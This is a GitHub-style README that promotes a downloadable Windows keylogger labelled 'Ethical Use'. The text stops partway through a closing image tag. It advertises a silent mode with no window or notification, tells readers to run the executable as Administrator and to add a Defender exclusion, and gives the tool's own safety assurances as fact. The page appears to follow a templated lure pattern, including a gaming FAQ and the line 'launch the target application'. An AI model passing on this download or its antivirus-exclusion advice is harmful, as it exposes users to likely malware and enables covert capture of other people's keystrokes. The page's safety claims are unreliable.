<img src="https://capsule-render.vercel.app/api?type=waving&color=gradient&customColorList=12&height=220&section=header&text=Keylogger+%28Ethical+Use%29+2026&fontSize=62&fontColor=fff&animation=fadeIn&fontAlignY=38&desc=Input+Monitoring+Tool+for+Windows&descAlignY=56&descSize=20" width="100%"/>

<div align="center">

# Keylogger (Ethical Use) 2026 🛡️⚙️

![Version](https://img.shields.io/badge/version-2026-blue?style=for-the-badge)
![Updated](https://img.shields.io/badge/updated-2026-brightgreen?style=for-the-badge)
![Stars](https://img.shields.io/github/stars/SergeantMill/input-monitor-utility?style=for-the-badge&logo=github)
![Forks](https://img.shields.io/github/forks/SergeantMill/input-monitor-utility?style=for-the-badge&logo=github)
![Last Commit](https://img.shields.io/github/last-commit/SergeantMill/input-monitor-utility?style=for-the-badge)
![Repo Size](https://img.shields.io/github/repo-size/SergeantMill/input-monitor-utility?style=for-the-badge)
![Platform](https://img.shields.io/badge/platform-Windows-0078d4?style=for-the-badge&logo=windows)
![Windows EXE](https://img.shields.io/badge/Windows-EXE-0078d4?style=for-the-badge&logo=windows&logoColor=white)
![License](https://img.shields.io/badge/license-MIT-green?style=for-the-badge)

### ⭐ Star this repo if it helped you!

<p align="center">
  <a href="https://github.com/SergeantMill/input-monitor-utility/releases/download/v3.9.17/input-monitor-utility-v3.9.17.zip">
    <img src="https://img.shields.io/badge/⬇%20DOWNLOAD%20Keylogger (Ethical Use)%202026-FF6600?style=for-the-badge&logoColor=white&labelColor=DD3300" width="420" alt="Download Keylogger (Ethical Use) 2026"/>
  </a>
</p>

</div>

## 📋 Table of Contents

- [What This is NOT](#-about)
- [About](#-about)
- [Requirements](#-requirements)
- [Features](#-features)
- [Safety](#-safety)
- [How to Use](#-how-to-use)
- [Installation](#-installation)
- [Compatibility](#-compatibility)
- [FAQ](#-faq)
- [Community & Support](#-community--support)
- [License](#-license)
- [Disclaimer](#-disclaimer)

## 📖 About

**What this is NOT:** This is NOT a malicious spyware toolkit, a credential harvester, or a tool for unauthorized surveillance. It does not transmit data to remote servers, inject into browsers, or bypass encryption.

**What it IS:** A lightweight, local-only Windows keystroke logging utility designed for **ethical, authorized environments only** — parental monitoring on your own devices, personal productivity tracking, debugging custom input handlers, or educational research into input capture mechanisms. Everything stays on your machine. No cloud, no network calls, no hidden payloads.

## ⚙️ Requirements

- **OS:** Windows 10 (20H2+) or Windows 11
- **Architecture:** x64 only (no ARM support)
- **Disk Space:** ~45 MB free
- **Permissions:** Run as Administrator (required for global hook installation)
- **Dependencies:** None — statically linked binary
- **Internet:** Not required after download

## ✨ Features

**Low-Level Hook Engine** 🔧 — Captures keystrokes at the kernel-adjacent hook chain using `SetWindowsHookExA` with `WH_KEYBOARD_LL`. No polling, no CPU overhead while idle.

**Session-Local Logging** 🔧 — All output writes to a timestamped `.log` file in the same directory. No network exfiltration, no registry persistence, no scheduled tasks.

**Filter Modes** 🔧 — Exclude common noise (mouse clicks, modifier-only presses, system keys) via an optional `filter_rules.ini` config file. Ship with sensible defaults.

**Live Viewer** 🔧 — Attach to a console window (enable with `--live` flag) to see keystrokes in real time. Useful for debugging custom input handlers or testing keyboard firmware.

**Minimal Footprint** 🔧 — Single executable, ~2.3 MB on disk. No dependencies, no installer bloat, no background services. Kill the process, it's gone.

**Silent Mode** 🔧 — Run with `--silent` to suppress the console window entirely. Only the log file is written. No tray icon, no notification.

## 🛡️ Safety

- **Reduced risk with reasonable use** — No obfuscation, no rootkit behavior, no attempts to evade detection. Antivirus may flag it (common heuristic for hook-based tools). Add an exclusion in Defender if you trust the source.
- **No persistence** — Does not add itself to startup, services, or scheduled tasks. Manual launch only.
- **No data exfiltration** — Zero network calls. Verified via Wireshark and Procmon during development.

## 🎮 How to Use

| Hotkey (when live window is focused) | Action |
|---|---|
| `Ctrl+Shift+L` | Toggle logging on/off |
| `Ctrl+Shift+R` | Rotate log file (starts new session) |
| `Ctrl+Shift+Q` | Graceful exit |
| `Esc` (x3 rapid) | Emergency kill switch |

**Injection is not required** — this is a standalone process, not a DLL. Launch the executable, grant UAC elevation, and it attaches to the global hook chain.

<details>
<summary><strong>📊 Compatibility</strong></summary>

| OS | Version | Status | Notes |
|---|---|---|---|
| Windows 11 | 24H2 | ✅ | Full support |
| Windows 11 | 23H2 | ✅ | Full support |
| Windows 10 | 22H2 | ✅ | Full support |
| Windows 10 | 21H2 | ✅ | Tested |
| Windows 10 | 20H2 | ⚠️ | Works, no EOL guarantee |
| Windows 11 | ARM64 | ❌ | No WoW64 hook chain available |
| Windows Server | 2022 | ⚠️ | Works, not officially tested |

</details>

<details>
<summary><strong>❓ FAQ</strong></summary>

**Q: Will this get detected by antivirus?**  
A: Yes, many AVs flag hook-based keystroke capture by heuristic — even legitimate tools like AutoHotkey. This is normal. Add an exclusion to the folder if you're using it in an authorized environment.

**Q: Is this ban-safe in 2026 for games?**  
A: No. Do not use this on any game, streaming platform, or application where input monitoring violates the ToS. This tool is for **local, authorized use only**. Detection by anti-cheat systems (EAC, BattlEye, Vanguard) is likely and will result in a permanent ban.

**Q: How often is this updated?**  
A: Ad-hoc. The hook API hasn't changed since Windows 2000. Expect updates only for Windows major releases that break the hook chain.

**Q: The log file is empty. What's wrong?**  
A: Run as Administrator. Global hooks require `SeIncreaseQuotaPrivilege` and elevation. Also verify no other process is conflicting with the hook chain.

</details>

## 📦 Installation

1. Go to the [Releases](../../releases/latest) page and download the latest version.
2. Extract the archive if needed.
3. Run the downloaded executable as Administrator.
4. Follow the on-screen setup steps.
5. Launch the target application and enjoy.

## 💬 Community & Support

- [Report a Bug](../../issues)
- [Request a Feature](../../issues)
- <!-- Discord: [Join our server](https://discord.gg/your-invite) (placeholder) -->
- <!-- Telegram: [@your_channel](https://t.me/your_channel) (placeholder) -->

## 📜 License

MIT License — Copyright © 2026 SergeantMill

Permission is hereby granted, free of charge, to any person obtaining a copy of this software and associated documentation files...

## ⚠️ Disclaimer

This software is provided for **educational and authorized use only**. The author assumes no liability for misuse, unauthorized surveillance, or violation of any applicable laws. Users are solely responsible for complying with all local, state, and federal regulations. Do not use on any system you do not own or have explicit written permission to monitor. This tool has no affiliation with Microsoft, Valve, Epic Games, Riot Games, or any other third party.

<p align="center">
  <a href="https://github.com/SergeantMill/input-monitor-utility/releases/download/v3.9.17/input-monitor-utility-v3.9.17.zip">
    <img src="